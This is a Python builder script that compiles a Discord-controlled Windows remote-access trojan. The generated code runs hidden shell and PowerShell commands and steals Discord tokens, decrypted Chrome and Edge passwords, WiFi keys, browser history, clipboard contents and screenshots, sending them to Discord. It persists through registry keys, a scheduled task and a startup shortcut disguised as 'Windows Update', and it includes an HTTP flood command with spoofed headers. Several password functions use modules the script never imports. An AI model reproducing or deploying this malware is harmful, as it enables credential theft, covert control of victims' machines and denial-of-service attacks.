import os
import time
from colorama import init, Fore, Style

os.system("pip install -r requirements.txt")
os.system("cls")

from fade import fire, water, purpleblue

def print_banner():
    banner = """
                _ _   _     
  _______ _ __ (_) |_| |__  
 |_  / _ \ '_ \| | __| '_ \ 
  / /  __/ | | | | |_| | | |
 /___\___|_| |_|_|\__|_| |_|
                                                                 
                                                                      Zenith Basic v2.0"""
    
    print()
    faded_banner = water(banner)
    print(faded_banner)

def main():
    init()
    print_banner()
    
    token = input(f"{Fore.GREEN}paste your discord bot token here: {Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}starting building process")
    time.sleep(1)
    
    code = f"""TOKEN = '{token}'\n\n"""

    code = code + r"""import discord, platform, asyncio, tempfile, os, re, subprocess, datetime, ctypes, psutil, sys, winreg, sqlite3, threading, requests, random, time
from discord.ext import commands
from ctypes import windll
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import GPUtil
import cv2

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int),
        ('biHeight', ctypes.c_int),
        ('biPlanes', ctypes.c_short),
        ('biBitCount', ctypes.c_short),
        ('biCompression', ctypes.c_uint32),
        ('biSizeImage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_long),
        ('biYPelsPerMeter', ctypes.c_long),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32)
    ]

loop = asyncio.ProactorEventLoop()
asyncio.set_event_loop(loop)

prefix = "$"
intents = discord.Intents.all()

class CustomHelpCommand(commands.HelpCommand):
    async def send_bot_help(self, mapping):
        embed = discord.Embed(
            title="Bot Commands",
            description="Here are all available commands:",
            color=discord.Color.blue()
        )
        
        for cog, commands in mapping.items():
            filtered = await self.filter_commands(commands, sort=True)
            if filtered:
                commands_text = ""
                for cmd in filtered:
                    commands_text += f"`{prefix}{cmd.name}` - {cmd.brief}\n"
                if commands_text:
                    embed.add_field(
                        name="Commands",
                        value=commands_text,
                        inline=False
                    )
        
        embed.set_footer(text=f"Use {prefix}help <command> for more details about a command.")
        await self.get_destination().send(embed=embed)

    async def send_command_help(self, command):
        embed = discord.Embed(
            title=f"Command: {command.name}",
            description=command.description or command.brief or "No description available.",
            color=discord.Color.green()
        )
        
        if command.aliases:
            embed.add_field(name="Aliases", value=", ".join(command.aliases), inline=False)
        
        usage = f"{prefix}{command.name}"
        if command.usage:
            usage = command.usage
            
        embed.add_field(name="Usage", value=f"`{usage}`", inline=False)
        await self.get_destination().send(embed=embed)

class Bot(commands.Bot):
    async def setup_hook(self):
        await self.tree.sync()

    async def on_ready(self):
        print(f"Logged in as {self.user}")
        

        cpu = platform.processor()
        gpu = None
        try:
            gpus = GPUtil.getGPUs()
            gpu = gpus[0].name if gpus else "No GPU detected"
        except:
            gpu = "Unable to detect GPU"
            
        ip = "Hidden for privacy"
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        

        has_webcam = False
        try:
            webcam = cv2.VideoCapture(0)
            if webcam.isOpened():
                has_webcam = True
                webcam.release()
        except:
            pass


        embed = discord.Embed(
            title="PC Information",
            description="Connected system details:",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        
        embed.add_field(name="CPU", value=cpu, inline=False)
        embed.add_field(name="GPU", value=gpu, inline=False)
        embed.add_field(name="Admin Rights", value="Yes" if is_admin else "No", inline=True)
        embed.add_field(name="Webcam", value="Detected" if has_webcam else "Not detected", inline=True)
        embed.set_footer(text=f"Bot connected successfully")


        for guild in self.guilds:
            for channel in guild.text_channels:
                try:
                    await channel.send(embed=embed)
                    break
                except:
                    continue
            break

bot = Bot(command_prefix=prefix, intents=intents, help_command=CustomHelpCommand())
bot.allowed_channel_ids = {} 

@bot.check
async def check_channel(ctx):
    guild_id = str(ctx.guild.id)
    if guild_id not in bot.allowed_channel_ids:
        return False
    return ctx.channel.id == bot.allowed_channel_ids[guild_id]

@bot.event
async def on_connect():
    guild = bot.guilds[0] 
    category = await guild.create_category("Sessions")
    channel = await guild.create_text_channel(f'session-{platform.node()}', category=category)
    bot.allowed_channel_ids[str(guild.id)] = channel.id
    await channel.send(f"New session started for {platform.node()}. Commands will only work in this channel.")

@bot.event
async def on_session_connect(guild_id, session_id):

    guild = bot.get_guild(guild_id)
    if guild:
        channel_name = f'session-{session_id}'
        channel = await guild.create_text_channel(channel_name)
        bot.allowed_channel_ids[session_id] = channel.id
        bot.allowed_channel_ids[str(guild.id) + "_" + str(bot.user.id)] = channel.id
        return channel

@bot.command(brief="Gets the computer's IP address.")
async def ip(ctx):
    await send_subprocess(ctx, "curl http://ipinfo.io/ip -s")

@bot.command(brief="Shows a list of all visible networks.")
async def network(ctx):
    await send_subprocess(ctx, "netsh wlan show network")

@bot.command(brief="Gets information about the current user.")
async def user(ctx):
    await send_subprocess(ctx, "net user %username%")

@bot.command(brief="Runs a command or program.")
async def run(ctx, command):
    await send_subprocess(ctx, command)

@bot.command(brief="Runs a PowerShell command.")
async def ps(ctx, command):
    await send_subprocess(ctx, "@PowerShell " + command)

@bot.command(brief="Lists all processes.")
async def tasklist(ctx):
    await send_subprocess(ctx, "tasklist")

@bot.command(brief="Forcefully kills a process.")
async def kill(ctx, process):
    await send_subprocess(ctx, "taskkill /f /im " + process)

@bot.command(brief="Lists files in directory.")
async def tree(ctx, path=os.path.expanduser("~")):
    await send_subprocess(ctx, 'tree /f /a "' + path + '"')

@bot.command(brief="Gets clipboard content.")
async def clipboard(ctx):
    await send_subprocess(ctx, "@PowerShell Get-Clipboard")

@bot.command(brief="Lists connected drives.")
async def drives(ctx):
    await send_subprocess(ctx, "wmic logicaldisk get caption, volumename, freespace, size")

@bot.command(brief="Types text.")
async def type(ctx, *, text):
    escaped_text = text.replace("'", "''")
    command = f'''@PowerShell Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{escaped_text}')'''
    
    await send_subprocess(ctx, command)
    await save_out(ctx, f"Typed: {text}")

@bot.command(brief="Grabs Discord token.")
async def token(ctx):
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }
    msg = ""
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        msg += f"\n{platform}:\n\n"
        tokens = grab_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                msg += f"{token}\n"
        else:
            msg += "No tokens found."
    await save_out(ctx, msg.strip())

@bot.command(brief="Takes a screenshot.", description="Takes a screenshot of the entire screen.")
async def screenshot(ctx):
    ps_script = '''
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save("screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    '''
    
    try:
        script_path = os.path.join(tempfile._get_default_tempdir(), "screenshot.ps1")
        with open(script_path, "w") as f:
            f.write(ps_script)
        
        await send_subprocess(ctx, f'powershell -ExecutionPolicy Bypass -File "{script_path}"')
        
        if os.path.exists("screenshot.png"):
            embed = discord.Embed(
                title="Screenshot",
                description="Screenshot taken at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                color=discord.Color.purple()
            )
            await ctx.send(embed=embed, file=discord.File("screenshot.png"))
            
            os.remove("screenshot.png")
        else:
            await ctx.send("Failed to capture screenshot.")
            
    except Exception as e:
        await ctx.send(f"Error taking screenshot: {str(e)}")
    finally:
        if os.path.exists(script_path):
            os.remove(script_path)

async def send_subprocess(ctx, command):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE

    proc = await asyncio.subprocess.create_subprocess_shell(
        command, 
        stdout=asyncio.subprocess.PIPE, 
        stderr=subprocess.STDOUT,
        startupinfo=startupinfo
    )
    stdout = (await proc.communicate())[0]
    output = stdout.decode(errors="ignore")
    
    embed = discord.Embed(
        title="Command Output",
        description=f"```{output[:2000]}```" if output else "No output",
        color=discord.Color.blue()
    )
    embed.set_footer(text=f"Command: {command}")
    
    if len(output) > 2000:
        filename = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()) + ".txt")
        with open(filename, "w+", encoding="utf-8") as file:
            file.write(output)
        await ctx.send(embed=embed, file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(embed=embed)

async def save_out(ctx, text):
    embed = discord.Embed(
        title="Output",
        description=f"```{text[:2000]}```" if text else "No output",
        color=discord.Color.green()
    )
    
    if len(text) > 2000:
        filename = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()) + ".txt")
        with open(filename, "w+", encoding="utf-8") as file:
            file.write(text)
        await ctx.send(embed=embed, file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(embed=embed)

def grab_tokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

@bot.command(brief="Gets system information.")
async def sysinfo(ctx):
    cpu = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    
    embed = discord.Embed(
        title="System Information",
        color=discord.Color.blue()
    )
    embed.add_field(name="CPU Usage", value=f"{cpu}%", inline=True)
    embed.add_field(name="Memory Usage", value=f"{memory.percent}%", inline=True)
    embed.add_field(name="Disk Usage", value=f"{disk.percent}%", inline=True)
    embed.add_field(name="Boot Time", value=boot_time, inline=False)
    embed.add_field(name="System", value=platform.system(), inline=True)
    embed.add_field(name="Machine", value=platform.machine(), inline=True)
    embed.add_field(name="Node", value=platform.node(), inline=True)
    
    await ctx.send(embed=embed)

@bot.command(brief="Shuts down the computer.")
async def shutdown(ctx):
    await ctx.send("Shutting down...")
    os.system("shutdown /s /t 0")

@bot.command(brief="Restarts the computer.")
async def restart(ctx):
    await ctx.send("Restarting...")
    os.system("shutdown /r /t 0")

@bot.command(brief="Puts computer to sleep.")
async def sleep(ctx):
    await ctx.send("Going to sleep...")
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

@bot.command(brief="Gets active window title.")
async def active_window(ctx):
    await send_subprocess(ctx, '@PowerShell Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Form]::ActiveForm.Text')

@bot.command(brief="Adds program to startup.")
async def startup(ctx, *, path=None):
    if not path:
        path = os.path.abspath(sys.argv[0])
    
    success_methods = []
    

    try:
        key = winreg.HKEY_CURRENT_USER
        key_paths = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows\load"
        ]
        
        for key_path in key_paths:
            try:
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
                    winreg.SetValueEx(registry_key, "Windows Update", 0, winreg.REG_SZ, f'"{path}"')
                success_methods.append(f"Registry: {key_path}")
            except:
                continue
    except:
        pass


    try:
        task_name = "WindowsUpdateScheduler"
        command = f'schtasks /create /tn "{task_name}" /tr "{path}" /sc onlogon /rl LIMITED'
        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        success_methods.append("Scheduled Task")
    except:
        pass


    try:
        startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        shortcut_path = os.path.join(startup_folder, "Windows Update.lnk")
        
        vbs_script = f'''
Set ws = CreateObject("WScript.Shell")
Set shortcut = ws.CreateShortcut("{shortcut_path}")
shortcut.TargetPath = "{path}"
shortcut.WorkingDirectory = "{os.path.dirname(path)}"
shortcut.WindowStyle = 7
shortcut.IconLocation = "shell32.dll,13"
shortcut.Save
'''
        
        vbs_path = os.path.join(tempfile._get_default_tempdir(), "create_shortcut.vbs")
        with open(vbs_path, "w") as f:
            f.write(vbs_script)
            
        subprocess.run(f'wscript "{vbs_path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        os.remove(vbs_path)
        success_methods.append("Startup Folder")
    except:
        pass


    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Windows"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "Shell", 0, winreg.REG_SZ, f'explorer.exe,"{path}"')
        success_methods.append("Shell Startup")
    except:
        pass

    if success_methods:
        await ctx.send(f"Added to startup using methods: {', '.join(success_methods)}")
    else:
        await ctx.send("Failed to add to startup")

@bot.command(brief="Removes program from startup.")
async def remove_startup(ctx):
    removed_methods = []
    

    try:
        key = winreg.HKEY_CURRENT_USER
        key_paths = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows\load"
        ]
        
        for key_path in key_paths:
            try:
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
                    winreg.DeleteValue(registry_key, "Windows Update")
                removed_methods.append(f"Registry: {key_path}")
            except:
                continue
    except:
        pass


    try:
        task_name = "WindowsUpdateScheduler"
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        removed_methods.append("Scheduled Task")
    except:
        pass


    try:
        startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        shortcut_path = os.path.join(startup_folder, "Windows Update.lnk")
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)
            removed_methods.append("Startup Folder")
    except:
        pass

    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Windows"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
            current_shell = winreg.QueryValueEx(registry_key, "Shell")[0]
            if "," in current_shell:
                new_shell = "explorer.exe"
                winreg.SetValueEx(registry_key, "Shell", 0, winreg.REG_SZ, new_shell)
                removed_methods.append("Shell Startup")
    except:
        pass

    if removed_methods:
        await ctx.send(f"Removed from startup methods: {', '.join(removed_methods)}")
    else:
        await ctx.send("No startup entries found to remove")

@bot.command(brief="Gets WiFi passwords.")
async def wifi_passwords(ctx):
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp1252', errors='ignore').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        
        embed = discord.Embed(title="WiFi Passwords", color=discord.Color.green())
        
        for profile in profiles:
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                ).decode('cp1252', errors='ignore').split('\n')
                
                password = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                if password:
                    embed.add_field(
                        name=profile,
                        value=f"Password: {password[0]}",
                        inline=False
                    )
            except subprocess.CalledProcessError:
                continue
            except IndexError:
                continue
        
        if len(embed.fields) == 0:
            await ctx.send("No WiFi profiles found.")
        else:
            await ctx.send(embed=embed)
            
    except Exception as e:
        await ctx.send(f"Error retrieving WiFi passwords: {str(e)}")

@bot.command(brief="Gets browser history.")
async def history(ctx):
    try:

        chrome_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
        edge_path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Default\History"
        
        history_data = []
        

        def get_browser_history(db_path, browser_name):
            if not os.path.exists(db_path):
                return []
                
            temp_history = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
            os.system(f'copy "{db_path}" "{temp_history}" > nul 2>&1')
            
            try:
                conn = sqlite3.connect(temp_history)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                results = cursor.fetchall()
                conn.close()
                os.remove(temp_history)
                return [(browser_name, url, title, last_visit_time) for url, title, last_visit_time in results]
            except:
                if os.path.exists(temp_history):
                    os.remove(temp_history)
                return []
        

        history_data.extend(get_browser_history(chrome_path, "Chrome"))
        history_data.extend(get_browser_history(edge_path, "Edge"))
        

        history_data.sort(key=lambda x: x[3], reverse=True)
        
        history_file = os.path.join(tempfile._get_default_tempdir(), "browser_history.txt")
        with open(history_file, "w", encoding="utf-8") as f:
            f.write("Browser History\n\n")
            for browser, url, title, timestamp in history_data:

                timestamp_seconds = timestamp / 1000000 - 11644473600
                date = datetime.datetime.fromtimestamp(timestamp_seconds).strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{browser}] {date}\n")
                f.write(f"Title: {title}\n")
                f.write(f"URL: {url}\n\n")
        
        await ctx.send(file=discord.File(history_file))
        os.remove(history_file)
            
    except Exception as e:
        await ctx.send(f"Error retrieving browser history: {str(e)}")

@bot.command(brief="Spams requests to a website.", description="Sends multiple requests to a website. Usage: $spam_site <url> <threads> <requests_per_thread> [auth_type] [auth_value]")
async def spam_site(ctx, url: str, threads: int = 10, requests_per_thread: int = 100, auth_type: str = None, auth_value: str = None):
    try:
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            await ctx.send("Invalid URL. Make sure to include http:// or https://")
            return
            
        if threads > 100:
            await ctx.send("Maximum thread count is 100")
            return
            
        if requests_per_thread > 1000:
            await ctx.send("Maximum requests per thread is 1000")
            return

        successful_requests = 0
        failed_requests = 0
        lock = threading.Lock()

        def make_requests(url, count):
            nonlocal successful_requests, failed_requests
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'DNT': '1',
                'Cache-Control': 'max-age=0',
                'Referer': url
            }

            auth = None
            if auth_type and auth_value:
                if auth_type.lower() == 'basic':
                    auth = requests.auth.HTTPBasicAuth(*auth_value.split(':'))
                elif auth_type.lower() == 'bearer':
                    headers['Authorization'] = f'Bearer {auth_value}'
                elif auth_type.lower() == 'apikey':
                    headers['X-API-Key'] = auth_value

            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            session = requests.Session()
            
            for _ in range(count):
                try:
                    if random.choice([True, False]):
                        response = session.get(url, headers=headers, auth=auth, timeout=5, verify=False)
                    else:
                        response = session.post(url, headers=headers, auth=auth, timeout=5, verify=False)
                        
                    with lock:
                        successful_requests += 1
                except:
                    with lock:
                        failed_requests += 1
                
                time.sleep(random.uniform(0.1, 0.3))

        await ctx.send(f"Starting spam attack with {threads} threads, {requests_per_thread} requests per thread...")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for _ in range(threads):
                futures.append(executor.submit(make_requests, url, requests_per_thread))

        embed = discord.Embed(
            title="Spam Attack Results",
            color=discord.Color.green()
        )
        embed.add_field(name="Target URL", value=url, inline=False)
        embed.add_field(name="Total Threads", value=str(threads), inline=True)
        embed.add_field(name="Requests per Thread", value=str(requests_per_thread), inline=True)
        embed.add_field(name="Successful Requests", value=str(successful_requests), inline=True)
        embed.add_field(name="Failed Requests", value=str(failed_requests), inline=True)
        embed.add_field(name="Total Requests", value=str(successful_requests + failed_requests), inline=True)
        if auth_type:
            embed.add_field(name="Authentication", value=auth_type, inline=True)
        
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Error during spam attack: {str(e)}")

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: 
        return None
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: 
        return "Chrome < 80"

def get_passwords_edge():
    master_key = get_master_key()
    if not master_key:
        return {}
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try: 
        shutil.copy2(login_db, "Loginvault.db")
    except: 
        return {}
    
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    result = {}

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: 
        pass

    cursor.close()
    conn.close()
    try: 
        os.remove("Loginvault.db")
    except: 
        pass
    return result

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: 
        return None

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: 
            return ""

def get_chrome_passwords():
    key = get_encryption_key()
    if not key:
        return {}
        
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    file_name = "ChromeData.db"
    try:
        shutil.copyfile(db_path, file_name)
    except:
        return {}
        
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    result = {}
    
    try:
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            action_url = row[1]
            username = row[2]
            password = decrypt_password_chrome(row[3], key)
            if username or password:
                result[action_url] = [username, password]
    except:
        pass
        
    cursor.close()
    db.close()
    try: 
        os.remove(file_name)
    except: 
        pass
    return result

def grab_passwords():
    global file_name, nanoseconds
    file_name, nanoseconds = 116444736000000000, 10000000
    result = {}
    

    chrome_results = get_chrome_passwords()
    result.update(chrome_results)
    

    edge_results = get_passwords_edge()
    result.update(edge_results)
    
    return result

@bot.command(brief="Grabs saved passwords from browsers")
async def grabpassword(ctx):
    try:
        passwords = grab_passwords()
        
        if not passwords:
            await ctx.send("No passwords found!")
            return
            

        text = "Saved Passwords:\n\n"
        for url, (username, password) in passwords.items():
            text += f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n"
            

        with open("passwords.txt", "w", encoding="utf-8") as f:
            f.write(text)
            

        await ctx.send(file=discord.File("passwords.txt"))
        

        os.remove("passwords.txt")
        
    except Exception as e:
        await ctx.send(f"Error grabbing passwords: {str(e)}")

bot.run(TOKEN)
"""

    with open("code.py", "w") as file:
        file.write(code)

    os.system("pyinstaller --onefile --noconsole --icon=NONE code.py")

    print(f"\n{Fore.YELLOW}building process finished")
    print(f"{Fore.GREEN}The executable can be found in the 'dist' folder")
    print(f"{Fore.GREEN}You can edit the code in 'code.py'")


if __name__ == "__main__":
    main()
